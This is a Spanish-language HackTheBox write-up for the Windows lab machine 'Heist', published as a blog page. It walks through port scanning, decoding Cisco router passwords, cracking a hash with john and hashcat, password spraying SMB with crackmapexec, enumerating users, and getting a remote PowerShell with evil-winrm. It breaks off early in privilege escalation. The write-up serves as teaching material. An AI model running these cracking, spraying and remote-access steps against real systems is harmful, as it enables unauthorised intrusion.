@@ -1,0 +1,1358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Heist</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Heist | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Heist" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel fácil, jugaremos con crackeo de passwords Cisco, movimientos laterales para encontrar usuarios a los cuales no teníamos acceso yyyyyy dumpearemos procesos de Firefox para ver que está pasando por detrás." />
+<meta property="og:description" content="Máquina Windows nivel fácil, jugaremos con crackeo de passwords Cisco, movimientos laterales para encontrar usuarios a los cuales no teníamos acceso yyyyyy dumpearemos procesos de Firefox para ver que está pasando por detrás." />
+<link rel="canonical" href="http://localhost:4000/htb/heist" />
+<meta property="og:url" content="http://localhost:4000/htb/heist" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-15T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201banner.png" />
+<meta property="twitter:title" content="HackTheBox - Heist" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-06-15T00:00:00-07:00","datePublished":"2021-06-15T00:00:00-07:00","description":"Máquina Windows nivel fácil, jugaremos con crackeo de passwords Cisco, movimientos laterales para encontrar usuarios a los cuales no teníamos acceso yyyyyy dumpearemos procesos de Firefox para ver que está pasando por detrás.","headline":"HackTheBox - Heist","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/heist"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/heist"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Heist</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-06-15">15 Jun 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201banner.png" alt="HackTheBox - Heist">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina <strong>Windows</strong> nivel fácil, jugaremos con crackeo de passwords <strong>Cisco</strong>, movimientos laterales para encontrar usuarios a los cuales no teníamos acceso yyyyyy dumpearemos procesos de <strong>Firefox</strong> para ver que está pasando por detrás.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201heistHTB.png" alt="201heistHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/8308">MinatoTW</a>.</p>
+
+<p>Bonito camino para un camino bonito.</p>
+
+<p>Nos enfrentaremos a un servicio web enfocado en “Soporte”, enumerando la web veremos que existe un apartado de <em>issues</em>, en un comentario de un usuario llamado <strong>hazard</strong> tendremos un archivo con la configuración de un router, de ahí obtendremos vaaaarias contraseñas encriptadas <strong>Cisco</strong> (con usuarios), jugaremos para desencriptarlas. Lograremos encontrar una contraseña válida par el usuario <strong>Hazard</strong> contra el servicio <strong>SMB</strong> (:</p>
+
+<p>Pero con esas credenciales no tendremos acceso a ninguna carpeta compartida interesante ni serán funcionales para jugar con <strong>evil-winrm</strong>… Enumerando el servicio <strong>SMB</strong> encontraremos la herramienta <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py">lookupsid.py</a> que nos permitirá enumerar usuarios locales del la máquina. Volviendo a validar las credenciales obtenidas anteriormente, pero ahora con los nuevos usuarios conseguiremos que unas sean válidas contra el usuario <strong>Chase</strong>, las usaremos para obtener una <strong>PowerShell</strong> en el sistema.</p>
+
+<p>Enumerando el sistema nos daremos cuenta de que <strong>Firefox</strong> está instalado (es curioso, ya que normalmente no lo esta :P) yyyy que hay procesos siendo ejecutados actualmente por él, usaremos la herramienta <strong>procdump.exe</strong> para dumpear todo lo relacionado a algún proceso <strong>Firefox</strong>, tendremos que jugar con ese dump para buscar cositas, finalmente encontraremos unas credenciales que intentan logearse contra el servicio web de “Soporte”, curiosamente son del admin de la web, tomaremos esa contraseña y haciendo reutilización de credenciales conseguiremos una <strong>PowerShell</strong> como el usuario <strong>Administrator</strong> en el sistema.</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Algo de suciedad en las manos con muchas ganas de llegar a ser real.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>A recorrer caminos saltando entre nubes 🌆</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#enum-nmap">Escaneos con <strong>nmap</strong></a>.</li>
+      <li><a href="#puerto-80">Enumeración web (puerto 80)</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación</a>.
+    <ul>
+      <li><a href="#cracking-config-txt">Crackeando passwords de Cisco</a>.</li>
+      <li><a href="#finding-valid-creds">Obteniendo credenciales válidas contra el servicio <strong>SMB</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#movimiento-lateral-enum-users">Movimiento lateral - Enumerando usuarios locales (no podemos hacer nada con los anteriores 🤪)</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>…</p>
+
+<h3 id="enum-nmap">Enumeración de puertos con nmap <a href="#enum-nmap">⌖</a></h3>
+
+<p>Como siempre, empezaremos validando que puertos hay activos (y visibles externamente) en la máquina, usaremos <strong>nmap</strong> para este propósito:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.149 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Sat Jun 12 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.149
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.149 () Status: Up
+Host: 10.10.10.149 () Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 445/open/tcp//microsoft-ds///  Ignored State: filtered (65532)
+# Nmap done at Sat Jun 12 25:25:25 2021 -- 1 IP address (1 host up) scanned in 309.35 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong>: Servidor web</td>
+    </tr>
+    <tr>
+      <td>135,445</td>
+      <td style="text-align: left"><strong><a href="https://www.varonis.com/blog/smb-port/">SMB</a></strong>: Nos permite compartir información a través de una red de nodos.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora haremos un escaneo de versiones y scripts relacionados con los puertos encontrados, así lograremos obtener información muuucho más concreta de lo que tenemos:</p>
+
+<p><strong>~·~·~(Para copiar los puertos directamente en la clipboard, hacemos uso de la función referenciada antes (<code>extractPorts</code>)</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.149
+    [*] Open ports: 80,135,445
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~·~·~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 80,135,445 -sC -sV 10.10.10.149 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Y obtenemos como resultado:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+# Nmap 7.80 scan initiated Sat Jun 12 25:25:25 2021 as: nmap -p 80,135,445 -sC -sV -oN portScan 10.10.10.149
+Nmap scan report for 10.10.10.149
+Host is up (0.11s latency).
+
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Support Login Page
+|_Requested resource was login.php
+135/tcp open  msrpc         Microsoft Windows RPC
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 11m07s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-06-12T14:40:28
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jun 12 25:25:25 2021 -- 1 IP address (1 host up) scanned in 53.67 seconds
+</code></pre>
+
+<p>Cositas relevantes de nuestro escaneo:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Microsoft IIS httpd 10.0</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Info del servidor web:</p>
+
+<ul>
+  <li>Título: <strong>Support Login Page</strong></li>
+  <li>Recurso: <code>login.php</code></li>
+</ul>
+
+<p>Bien, por ahora no tenemos nada más, así que a enumerar (:</p>
+
+<p>…</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201page80.png" alt="201page80" /></p>
+
+<p>Tenemos un <strong>panel login</strong> de una plataforma de “soporte”. Probando credenciales nos redirige a <code>/errorpage.php</code> al ser inválidas ):</p>
+
+<p>Hay un link que nos permite ingresar al sitio como invitados (guest), si damos clic llegamos a <code>/issues.php</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201page80_issues.png" alt="201page80_issues" /></p>
+
+<p>Bien, vemos varias cosas:</p>
+
+<ul>
+  <li>“<em>Here’s a part of the configuration</em>”: Haciendo referencia al <strong>Attachment</strong> que agrego al comentario.
+    <ul>
+      <li>Que si damos clic nos redirige a <code>/attachments/config.txt</code>. (Ya lo miraremos)</li>
+    </ul>
+  </li>
+  <li>“<em>please create an account for me on the windows server as I need to access the files</em>”: Sabemos que hay una cuenta llamada <strong>Hazard</strong>.
+    <ul>
+      <li>Puede hacer referencia al portal web (pero también podemos pensar que existe en el servidor <strong>SMB</strong> (al hablar de “access the files”))</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Veamos <code>config.txt</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201page80_attachment_configTXT.png" alt="201page80_attachment_configTXT" /></p>
+
+<p>Estamos ante un archivo de configuracion de un router de <strong>Cisco</strong>, dentro hay data de usuarios:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201page80_attachment_configTXT_creds.png" alt="201page80_attachment_configTXT_creds" /></p>
+
+<p>Perfecto, tenemos:</p>
+
+<ul>
+  <li>Un <strong>hash</strong> tipo Cisco-IOS: <code>$1$pdQG$o8nrSzsGXeaduXrjlvKc91</code>:
+    <ul>
+      <li>Según <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">example-hashes</a>. (Filtrando en toda la web por <code>$1$</code>)</li>
+    </ul>
+  </li>
+  <li>Tres usuarios: <code>secret</code>, <code>rout3r</code> y <code>admin</code> con sus respectivas contraseñas, pero están encriptadas :P</li>
+</ul>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>…</p>
+
+<h3 id="cracking-config-txt">Crackeo de passwords archivo config.txt <a href="#cracking-config-txt">⌖</a></h3>
+
+<p>Buscando en internet un poco más de enfoque y entendimiento, llegamos a este recurso donde explican la diferencia entre <code>enable password</code> y <code>enable secret</code> (en nuestro caso <code>\&lt;username\&gt; password</code> y <code>enable secret</code>):</p>
+
+<p><strong>(Lo que importa entender es la diferencia entre <code>secret</code> y <code>password</code>)</strong></p>
+
+<ul>
+  <li><a href="https://www.net4us.com.mx/single-post/2016/06/05/enable-password-vs-enable-secret">Enable password vs Enable secret</a>.</li>
+</ul>
+
+<blockquote>
+  <p>La diferencia recae en que el comando <code>enable password</code> encripta el password, (por lo que se puede desencriptar) y <code>enable secret</code> crea un hash a partir del password y este “no” se puede “desencriptar”.</p>
+</blockquote>
+
+<p>Teniendo esto en mente y tomando como ejemplo lo que tenemos del archivo <code>config.txt</code>, entendemos que:</p>
+
+<pre><code class="language-txt">enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+</code></pre>
+
+<ul>
+  <li><code>5</code>: Es el <a href="https://www.cisco.com/c/m/en_us/techdoc/dc/reference/cli/n5k/commands/enable-secret.html">formato en el que está encriptado</a>.</li>
+</ul>
+
+<pre><code class="language-txt">username rout3r password 7 0242114B0E143F015F5D1E161713
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
+</code></pre>
+
+<ul>
+  <li>Pasa exactamente lo mismo acá, el <code>7</code> es el formato en el que está encriptado.</li>
+</ul>
+
+<p>Bien, siguiendo el artículo de las diferencias](https://www.net4us.com.mx/single-post/2016/06/05/enable-password-vs-enable-secret) vemos que las contraseñas pueden ser crackeadas, nos provee con un recurso encargado de ello:</p>
+
+<ul>
+  <li><a href="http://www.ifm.net.nz/cookbooks/passwordcracker.html">http://www.ifm.net.nz/cookbooks/passwordcracker.html</a>.</li>
+</ul>
+
+<p>Simplemente debemos colocar las contraseñas encriptadas al usar <code>password</code> como comando, o sea:</p>
+
+<ul>
+  <li><code>0242114B0E143F015F5D1E161713</code>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201google_cisco_cracker_rout3r.png" alt="201google_cisco_cracker_rout3r" /></p>
+
+<ul>
+  <li><code>02375012182C1A1D751618034F36415408</code>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201google_cisco_cracker_admin.png" alt="201google_cisco_cracker_admin" /></p>
+
+<p>Bien, conseguimos crackear las dos contraseñas, pero aún nos queda jugar con el <strong>hash</strong> y ver si podemos crackearlo también, buscando un poco más llegamos a este recurso que nos muestra varios ejemplos con diferentes formatos de hashes en Cisco (0, 4, 5, 7, 8 y 9):</p>
+
+<ul>
+  <li><a href="https://www.infosecmatter.com/cisco-password-cracking-and-decrypting-guide/">Cisco password cracking and decrypting guide</a>.</li>
+</ul>
+
+<p>Viendo cada uno, <a href="https://www.infosecmatter.com/cisco-password-cracking-and-decrypting-guide/#cisco-type-5-password">nos fijamos en el formato <strong>5</strong></a>, ya que es idéntico (el inicio del hash = identificador del hash) al nuestro:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201google_cisco_password_type5.png" alt="201google_cisco_password_type5" /></p>
+
+<p>Yyy nos da el comando para intentar crackearlo, así que guardamos el hash en un archivo (lo llamaremos <code>secret.hash</code>) y ejecutamos:</p>
+
+<pre><code class="language-bash">❱ john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt secret.hash
+</code></pre>
+
+<pre><code class="language-bash">Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+stealth1agent    (?)
+...
+Session completed
+</code></pre>
+
+<p>Perfecto, conseguimos en texto plano la cadena <code>stealth1agent</code>.</p>
+
+<p>Aprovechemos para hacer el mismo proceso pero ahora con <strong>hashcat</strong>:</p>
+
+<pre><code class="language-bash">❱ hashcat -m 500 -a 0 secret.hash /usr/share/wordlists/rockyou.txt -o cracked.txt
+</code></pre>
+
+<ul>
+  <li><code>-m</code>: Tipo de hash (500 al ser md5crypt).</li>
+  <li><code>-a</code>: Ataque tipo diccionario (para pasarle despues el wordlist).</li>
+  <li><code>-o</code>: Cuando haga la crakeazhion, guardara el resultado en el archivo <code>cracked.txt</code>.</li>
+</ul>
+
+<p>Ejecutamos yyyyy:</p>
+
+<pre><code class="language-bash">❱ cat cracked.txt 
+$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
+</code></pre>
+
+<p>Perfecto, el mismo resultado.</p>
+
+<p>…</p>
+
+<h3 id="finding-valid-creds">Encontrando credenciales válidas contra <em>SMB</em> <a href="#finding-valid-creds">⌖</a></h3>
+
+<p>Ahora que tenemos todas las contraseñas en texto plano y algunos usuarios, pues empecemos a probar y ver si en algún servicio son válidas.</p>
+
+<p><strong>SMB</strong>:</p>
+
+<p>Usemos <a href="https://www.elladodelmal.com/2020/05/crackmapexec-una-navaja-suiza-para-el.html">crackmapexec</a> para ir validándolas contra <em>samba</em>:</p>
+
+<pre><code class="language-bash">❱ crackmapexec smb 10.10.10.149 
+SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)  
+</code></pre>
+
+<ul>
+  <li>Obtenemos más info relevante, sistema operativo yyy dominio.</li>
+</ul>
+
+<p>Jugando con los usuarios del archivo <code>config.txt</code> no logramos obtener nada, peeeero, si recordamos habíamos hablado que podría existir el usuario <strong>hazard</strong>, pueeeeees:</p>
+
+<pre><code class="language-bash">❱ crackmapexec smb 10.10.10.149 -u 'hazard' -p 'incorrecta' 
+SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)  
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\hazard:incorrecta STATUS_LOGON_FAILURE 
+</code></pre>
+
+<pre><code class="language-bash">❱ crackmapexec smb 10.10.10.149 -u 'hazard' -p 'stealth1agent'
+SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)  
+SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
+</code></pre>
+
+<p>Lindo, las credenciales <code>hazard:stealth1agent</code> son válidas contra el servidor <strong>samba</strong> (: Veamos si tenemos recursos disponibles:</p>
+
+<pre><code class="language-bash">❱ smbmap -H 10.10.10.149 -u 'hazard' -p 'stealth1agent'
+[+] IP: 10.10.10.149:445        Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share  
+        IPC$                                                    READ ONLY       Remote IPC
+</code></pre>
+
+<p>Ningún recurso útil ):</p>
+
+<p>Probando en la web con las credenciales tampoco logramos nada nuevo. Entonces pensé que si no funcionan contra la web, probablemente no sea una explotación web lo que debamos hacer.</p>
+
+<p>Entonces necesitaríamos algún servicio para probarlas, algo así como “<strong>SSH</strong>” así que recordé el servicio <strong>WinRM</strong> (que no fue descubierto en nuestro escaneo, pero pueda que simplemente se le haya pasado), así que volviendo a hacer el escaneo de <strong>nmap</strong> encontramos el puerto <strong>5985</strong>, el cual mantiene por lo general el servicio <strong>WinRM</strong>:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.149 
+...
+Discovered open port 5985/tcp on 10.10.10.149
+...
+</code></pre>
+
+<p>Y sí, estaba abierto, a veces pasa que el escaneo inicial no toma algunos puertos, entonces pues es bueno volver a ejecutarlo y así confirmamos o añadimos información.</p>
+
+<blockquote>
+  <p><strong>WinRM</strong> permite realizar tareas administrativas remotamente (en pocas palabras). <a href="https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/">Intro WinRM Windows</a>.</p>
+</blockquote>
+
+<p>Nos podemos aprovechar de <strong>WinRM</strong> para explotarlo mediante la herramienta <a href="https://www.hackplayers.com/2019/10/evil-winrm-shell-winrm-para-pentesting.html">evil-winrm</a>, para en caso de contar con credenciales válidas, probablemente conseguir una <strong>PowerShell</strong> en el sistema.</p>
+
+<p>Pero intentando con <code>hazard</code> no lo logramos ): Así que tamos F…</p>
+
+<p>…</p>
+
+<h2 id="movimiento-lateral-enum-users">Movimiento lateral : Enumerando usuarios locales <a href="#movimiento-lateral-enum-users">#</a></h2>
+
+<p>Siguiendo <a href="https://book.hacktricks.xyz/pentesting/pentesting-smb">esta guía</a> para enumerar <strong>SMB</strong> encontramos una herramienta para probar:</p>
+
+<blockquote>
+  <p>Enumerate local users with <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows">SID</a> brute-forcing.</p>
+</blockquote>
+
+<p>Apoyándonos del repositorio <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> usamos la herramienta <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py">lookupsid.py</a> para el brute-forcing:</p>
+
+<pre><code class="language-bash">❱ lookupsid.py SUPPORTDESK/Hazard:stealth1agent@10.10.10.149
+Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation   
+
+[*] Brute forcing SIDs at 10.10.10.149
+[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
+500: SUPPORTDESK\Administrator (SidTypeUser)
+501: SUPPORTDESK\Guest (SidTypeUser)
+503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+513: SUPPORTDESK\None (SidTypeGroup)
+1008: SUPPORTDESK\Hazard (SidTypeUser)
+1009: SUPPORTDESK\support (SidTypeUser)
+1012: SUPPORTDESK\Chase (SidTypeUser)
+1013: SUPPORTDESK\Jason (SidTypeUser)
+</code></pre>
+
+<p>Opa, obtenemos los usuarios locales yyyy no solo esta <strong>Hazard</strong>, al menos ya tenemos más para probar, así que hagámoslo sencillo, guardemos toooodas las credenciales en un archivo y con <strong>crackmapexec</strong> hagamos que vaya probando de una en una. Así no tenemos que hacerlo a mano :P</p>
+
+<pre><code class="language-bash">❱ cat users.txt 
+Administrator
+Guest
+DefaultAccount
+WDAGUtilityAccount
+None
+support
+Chase
+Jason
+secret
+admin
+rout3r
+stealth1agent
+Q4)sJu\Y8qz*A3?d
+$uperP@ssword
+</code></pre>
+
+<p>Y ahora le pasamos el archivo:</p>
+
+<pre><code class="language-bash">❱ crackmapexec smb 10.10.10.149 -u users.txt -p users.txt                                                                
+</code></pre>
+
+<p>Despues de un pequeño rato obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201bash_crackmapexec_user_chase.png" alt="201bash_crackmapexec_user_chase" /></p>
+
+<p>Unas nuevas credenciales, pues volvamos a probar con todas las opciones a ver…</p>
+
+<p>Finalmente ante <strong>evil-winrm</strong> conseguimos una <strong>PowerShell</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201bash_evilwinrm_chase.png" alt="201bash_evilwinrm_chase" /></p>
+
+<p>aksldfjlkajskleu (:</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Enumerando el sistema encontramos varias cositas:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; type todo.txt
+Stuff to-do:
+1. Keep checking the issues list.
+2. Fix the router config.
+
+Done:
+1. Restricted access for guest user.
+</code></pre>
+
+<p>Una lista de tareas…</p>
+
+<p>Podemos destacar algo “raro” de las cosas por hacer, nos indica que: <em>Se mantendrá un chequeo constante a la lista de problemas</em>, esto es llamativo porque a menos que tengan una persona todo el tiempo (todo el tiempo real, ahí mirando a cada rato) debe existir algún proceso monitoreando esa lista de problemas, ¿no?</p>
+
+<p>Esto toma algo de sentido cuando enumeramos los programas instalados en el sistema:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; dir "Program Files"
+
+    Directory: C:\Program Files
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+...
+d-----        2/18/2021   4:21 PM                Mozilla Firefox
+...
+</code></pre>
+
